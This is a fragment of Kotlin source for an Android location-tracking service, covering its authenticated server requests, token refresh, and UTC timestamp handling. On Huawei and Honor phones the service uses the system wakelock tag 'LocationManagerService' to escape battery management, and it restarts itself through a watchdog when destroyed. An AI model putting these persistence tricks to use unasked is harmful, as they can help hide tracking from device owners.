        } else if (deviceKey.isNotEmpty()) {
            headers["x-device-key"] = deviceKey
        } else {
            headers["x-api-key"] = API_KEY
        }
        return headers
    }

    private suspend fun postRaw(
        path: String,
        body: RequestBody,
        useApiKey: Boolean = false,
        extraHeaders: Map<String, String> = emptyMap(),
    ): Pair<Int, String?> =
        withContext(Dispatchers.IO) {
            try {
                val builder = Request.Builder()
                    .url("$SERVER$path")
                    .post(body)
                if (useApiKey) {
                    builder.addHeader("x-api-key", API_KEY)
                } else {
                    authHeaders().forEach { (k, v) -> builder.addHeader(k, v) }
                }
                extraHeaders.forEach { (k, v) -> builder.addHeader(k, v) }
                client.newCall(builder.build()).execute().use { it.code to it.body?.string() }
            } catch (e: Exception) { -1 to null }
        }

    private suspend fun post(path: String, body: RequestBody): String? =
        withContext(Dispatchers.IO) {
            try {
                val builder = Request.Builder()
                    .url("$SERVER$path")
                    .post(body)
                authHeaders().forEach { (k, v) -> builder.addHeader(k, v) }
                val response = client.newCall(builder.build()).execute()

                if (response.code in 200..299) {
                    response.use { it.body?.string() }
                } else if (response.code == 401) {
                    // Access token expired — try a refresh, then retry once.
                    response.close()
                    if (refreshToken != null && refreshAccessToken()) {
                        val retryBuilder = Request.Builder()
                            .url("$SERVER$path")
                            .post(body)
                        authHeaders().forEach { (k, v) -> retryBuilder.addHeader(k, v) }
                        client.newCall(retryBuilder.build()).execute().use { retry ->
                            if (retry.code in 200..299) {
                                retry.body?.string()
                            } else {
                                onAuthFailed()
                                null
                            }
                        }
                    } else {
                        // Access AND refresh tokens are dead — the server treats us
                        // as unauthenticated. Re-register so tracking continues
                        // instead of failing silently (this used to freeze the
                        // dashboard's "last seen" while the app showed Connected).
                        onAuthFailed()
                        null
                    }
                } else {
                    // Any other non-2xx (500, 429, ...) is a failure — never treat
                    // an error body as a valid response.
                    response.close()
                    null
                }
            } catch (e: Exception) { null }
        }

    private suspend fun get(path: String): String? =
        withContext(Dispatchers.IO) {
            try {
                val builder = Request.Builder()
                    .url("$SERVER$path")
                    .get()
                authHeaders().forEach { (k, v) -> builder.addHeader(k, v) }
                val response = client.newCall(builder.build()).execute()

                if (response.code in 200..299) {
                    response.use { it.body?.string() }
                } else if (response.code == 401) {
                    // Access token expired — try a refresh, then retry once.
                    response.close()
                    if (refreshToken != null && refreshAccessToken()) {
                        val retryBuilder = Request.Builder()
                            .url("$SERVER$path")
                            .get()
                        authHeaders().forEach { (k, v) -> retryBuilder.addHeader(k, v) }
                        client.newCall(retryBuilder.build()).execute().use { retry ->
                            if (retry.code in 200..299) {
                                retry.body?.string()
                            } else {
                                onAuthFailed()
                                null
                            }
                        }
                    } else {
                        onAuthFailed()
                        null
                    }
                } else {
                    // Any other non-2xx is a failure — never treat an error body
                    // as a valid response.
                    response.close()
                    null
                }
            } catch (e: Exception) { null }
        }

    /**
     * The server rejected our credentials (access AND refresh both dead).
     * Without this, post()/get() returned null forever while the app kept
     * showing "Connected" — the dashboard's last_seen went stale even though
     * the phone was alive. Re-register to mint a fresh token pair (also
     * re-links to the signed-in account). Idempotent: registerDevice() is
     * guarded by isRegistering and retries on failure.
     */
    private fun onAuthFailed() {
        if (isRegistered) {
            isRegistered = false
            scope.launch { registerDevice() }
        }
    }

    // ── Utils ─────────────────────────────────────────────────────────────────

    /**
     * Current time as an ISO-8601 UTC timestamp. The server validates
     * device_timestamp against UTC (within 5 minutes) — emitting local time
     * without an offset (e.g. UTC+1 in Nigeria) made every report look an
     * hour in the future and fail the anti-spoofing timestamp check.
     */
    private fun isoNow(): String {
        val fmt = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
        fmt.timeZone = TimeZone.getTimeZone("UTC")
        return fmt.format(Date())
    }

    // ── WakeLock Management ─────────────────────────────────────────────

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager

            val isHuawei = android.os.Build.MANUFACTURER.lowercase().contains("huawei") ||
                    android.os.Build.MANUFACTURER.lowercase().contains("honor")

            val tag = if (isHuawei) {
                "LocationManagerService" // Huawei-whitelisted system wakelock tag
            } else {
                "Magneetar:TrackingWakeLock"
            }

            wakeLock = powerManager.newWakeLock(
                android.os.PowerManager.PARTIAL_WAKE_LOCK,
                tag
            ).apply {
                acquire(25 * 60 * 1000L) // Auto-release after 25 minutes to avoid leaks
            }

            android.util.Log.d("TrackingService", "WakeLock acquired")
        } catch (e: Exception) {
            android.util.Log.e("TrackingService", "Failed to acquire WakeLock: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
        } catch (e: Exception) {
            // Ignore
        }
    }

    // ── Schedule periodic WakeLock re-acquisition (for Huawei PowerGenie workaround) ──
    // Huawei's PowerGenie kills wakelocks held for >60 minutes with non-whitelisted tags.
    // By re-acquiring every 20 minutes, we stay under the threshold.
    private fun scheduleWakelockRefresh() {
        scope.launch {
            while (true) {
                delay(20 * 60 * 1000L) // Every 20 minutes (before the 25 min auto-release)
                releaseWakeLock()
                acquireWakeLock()
            }
        }
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
        releaseWakeLock()
        scope.cancel()

        // Fire immediate restart via watchdog
        WatchdogReceiver.fireImmediateRestart(this)

        android.util.Log.d("TrackingService", "Service destroyed — watchdog will restart")
    }
}
